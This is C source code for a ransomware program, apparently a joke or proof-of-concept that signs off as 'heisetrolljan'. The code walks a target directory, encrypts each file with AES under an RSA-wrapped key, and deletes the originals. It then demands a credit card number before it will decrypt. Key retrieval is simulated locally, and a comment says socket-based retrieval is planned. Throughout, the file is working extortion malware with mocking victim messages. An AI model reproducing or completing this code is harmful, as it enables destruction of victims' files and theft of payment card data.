#include <limits.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "aes.h"
#include "ccard.h"
#include "config.h"
#include "etc.h"
#include "filecrypt.h"
#include "fslist.h"
#include "rsa.h"
#include "rsa_io.h"
#include "sha256.h"

#define PUBFILE			"enc_key.bin"
#define SECFILE			"dec_key.bin"

#define TOKEN_ACCEPTED	1
#define TOKEN_REJECTED	-1
#define UNKNOWN_KEY		-2
#define GENERIC_ERROR	-3

static int hasext(const char *filename, char *ext) {
	size_t namelen = strlen(filename);
	size_t extlen = strlen(ext);

	if(namelen < extlen + 1)
		return 0;

	if(strcmp(filename + namelen - extlen, ext))
		return 0;

	return 1;
}

static int enc_dir(const char *basedir, const uint8_t *key) {
	fslist_t *list;
	size_t i;
	char *infile, outfile[PATH_MAX];

	printf("Scanning '%s' for possible frobnications...\n", CONFIG_CRYPTDIR);
	
	if((list = fslist_scan(basedir)) == 0) return 0;

	for(i = 0; i < list->n; i++) {
		infile = list->filename[i];
		printf(" - %s\n", infile);
		snprintf(outfile, PATH_MAX, "%s%s", infile, CONFIG_CRYPTED_EXT);
		if(!hasext(infile, CONFIG_CRYPTED_EXT) ) {
			file_enc(infile, outfile, key);
			remove(infile);
		}
	}

	printf("Done.\n\n");

	fslist_free(list);
	return 1;
}

static int dec_dir(const char *basedir, const uint8_t *key) {
	fslist_t *list;
	size_t i;
	char *infile, outfile[PATH_MAX];

	printf("Scanning '%s' for trading cards...\n", CONFIG_CRYPTDIR);
	
	if((list = fslist_scan(basedir)) == 0) return 0;

	for(i = 0; i < list->n; i++) {
		infile = list->filename[i];
		printf(" - %s\n", infile);
		strncpy(outfile, infile, PATH_MAX);
		outfile[strlen(infile) - strlen(CONFIG_CRYPTED_EXT)] = '\0';
	
		if(hasext(infile, CONFIG_CRYPTED_EXT)) {
			file_dec(infile, outfile, key);
			remove(infile);
		}
	}

	printf("Done.\n\n");

	fslist_free(list);
	return 1;
}

static rsa_keypair_t *local_pubkey(uint8_t **serialized, size_t *len) {
	rsa_keypair_t *pair, *out = NULL;
	int status;
	uint8_t *backup;
	FILE *backupfp;

	if((pair = rsa_keypair_gen(CONFIG_RSA_KSIZE, &status)) == NULL) return NULL;
	if((backup = rsa_serialize_pair(pair, len)) == NULL) goto freepair;
	if((backupfp = fopen("backup.bin", "wb")) == NULL) goto freebackup;
	if(fwrite(backup, *len, 1, backupfp) == 0) goto closefp;
	if((*serialized = rsa_serialize_public(pair, len)) == NULL) goto closefp;

	out = pair;
closefp:
	fclose(backupfp);
freebackup:
	free(backup);
freepair:
	if(out == NULL)
		rsa_keypair_free(pair);
	return out;
}

static uint8_t *request_pubkey(void) {
	size_t pub_len, ct_len;
	rsa_keypair_t *pair;
	uint8_t *pub_serial, *sym_key, *enc_key, *out = NULL;
	FILE *fp;

	printf("Requesting the online gizmo...\n");
	if((sym_key = malloc(AES_KSIZE)) == NULL) return NULL;

	/* This will happen via sockets eventually. */
	if((pair = local_pubkey(&pub_serial, &pub_len)) == NULL) goto freesym;
	getrand(sym_key, AES_KSIZE, NULL);
	if((enc_key = rsa_enc_padded(sym_key, AES_KSIZE, pair, &ct_len)) == NULL) goto freepair;

	if((fp = fopen(PUBFILE, "wb")) == NULL) goto freeenc;

	if(fwrite(&pub_len, INT_SIZE, 1, fp) == 0) goto closefp;
	if(fwrite(pub_serial, pub_len, 1, fp) == 0) goto closefp;
	if(fwrite(&ct_len, INT_SIZE, 1, fp) == 0) goto closefp;
	if(fwrite(enc_key, ct_len, 1, fp) == 0) goto closefp;
	out = sym_key;

	printf("Done.\n\n");

closefp:
	fclose(fp);
freeenc:
	free(enc_key);
freepair:
	free(pub_serial);
	rsa_keypair_free(pair);
freesym:
	if(out == NULL)
		free(sym_key);
	return out;
}

static uint8_t *local_seckey(const char *token, const uint8_t *key_id, size_t *len, int *status) {
	FILE *fp;
	uint8_t *serial, mykey_id[32], *out = NULL;

	*status = TOKEN_REJECTED;
	if(cc_check(token, strlen(token)) != CC_OK) return NULL;

	*status = GENERIC_ERROR;
	if((fp = fopen("backup.bin", "rb")) == NULL) return NULL;
	if((*len = fp_size(fp)) == 0) return NULL;

	if((serial = malloc(*len)) == NULL) goto closefp;
	if(fread(serial, *len, 1, fp) == 0) goto freeserial;
	if(rsa_keyid_fromserial(serial, mykey_id) == 0) goto freeserial;
	
	*status = UNKNOWN_KEY;
	if(memcmp(key_id, mykey_id, SHA256_SIZE)) goto freeserial;

	*status = TOKEN_ACCEPTED;
	out = serial;

freeserial:
	if(out == NULL)
		free(serial);
closefp:
	fclose(fp);
	return out;
}

static uint8_t *request_seckey(const char *token, int *status) {
	rsa_keypair_t *pair;
	FILE *secfp, *pubfp;
	uint32_t offs;
	size_t declen, keylen, fsize = INT_SIZE;
	uint8_t *sec_key, key_id[32], *enc_key, *sym_key = NULL;
	uint8_t *buf;

	*status = GENERIC_ERROR;
	/* Read the encrypted symmetric key */
	if((pubfp = fopen(PUBFILE, "rb")) == NULL) return NULL;
	if(fread(&offs, INT_SIZE, 1, pubfp) == 0) return NULL;
	fsize += offs;
	if(fseek(pubfp, offs, SEEK_CUR) == -1) return NULL;
	if(fread(&offs, INT_SIZE, 1, pubfp) == 0) return NULL;
	fsize += offs;
	if((enc_key = malloc(offs)) == NULL) goto closepub;
	if(fread(enc_key, offs, 1, pubfp) == 0) goto freeenc;

	/* Get the key id */
	if(fseek(pubfp, INT_SIZE, SEEK_SET) == -1) goto freeenc;
	if((buf = malloc(fsize)) == NULL) goto freeenc;
	if(fread(buf, fsize, 1, pubfp) == 0) goto freebuf;
	if(rsa_keyid_fromserial(buf, key_id) == 0) goto freebuf;

	/* Do the actual request */
	if((sec_key = local_seckey(token, key_id, &keylen, status)) == NULL) goto freebuf;
	
	*status = GENERIC_ERROR;
	if((secfp = fopen(SECFILE, "wb")) != NULL) {
		fwrite(sec_key, keylen, 1, secfp);
		fclose(secfp);
	}
	
	if((pair = rsa_read_secret(sec_key, keylen)) == NULL) goto freesec;

	*status = TOKEN_ACCEPTED;
	sym_key = rsa_dec_padded(enc_key, offs, pair, &declen);

	rsa_keypair_free(pair);
freesec:
	free(sec_key);
freebuf:
	free(buf);
freeenc:
	free(enc_key);
closepub:
	fclose(pubfp);
	return sym_key;
}

static int current_runlevel(void) {
	FILE *fp;
	int runlevel = 0;

	/* Did we receive a public key yet? */
	if((fp = fopen(PUBFILE, "rb")) != NULL) {
		fclose(fp);
		runlevel = 1;
		
		/* Do we also have the secret key? */
		if((fp = fopen(SECFILE, "rb")) != NULL) {
			runlevel = 2;
			fclose(fp);
		}
	}
	
	return runlevel;
}

int main(void) {
	int runlevel, status;
	uint8_t *sym_key;
	char *request_token;

	runlevel = current_runlevel();

	switch(runlevel) {
		case 0:
			if((sym_key = request_pubkey()) == NULL) {
				fprintf(stderr, "Request failed.\n");
				return EXIT_FAILURE;
			}

			enc_dir(CONFIG_CRYPTDIR, sym_key);
			free(sym_key);
		case 1:
			printf("Oh noes! I accidentally on all your hats and broke your trophies. :/\n");
			printf("Enter your mom's credit card number to undo or press CTRL-C to cancel.\n");

			status = GENERIC_ERROR;
			do {
				if(status == TOKEN_REJECTED)
					printf("That didn't work :( Try again.\n");
				request_token = line_in(stdin);
				sym_key = request_seckey(request_token, &status);
				free(request_token);
			} while(status == TOKEN_REJECTED);

			if(status == GENERIC_ERROR) {
				fprintf(stderr, "Something went wrong. Too bad for your XP. Maybe try again later.\n");
				break;
			} else if(status == UNKNOWN_KEY) {
				fprintf(stderr, "Looks like I lost my key. Thanks anyway.\n");
				break;
			}
			printf("YAY! It worked! :D Let me upgrade your DLC...\n\n");
			dec_dir(CONFIG_CRYPTDIR, sym_key);
			free(sym_key);

			break;
		case 2:
			printf("Deleting keys... ");
			remove(PUBFILE);
			remove(SECFILE);
			printf("Done.\n");
			printf("Thank you for choosing heisetrolljan\n");
	}
	return EXIT_SUCCESS;
}
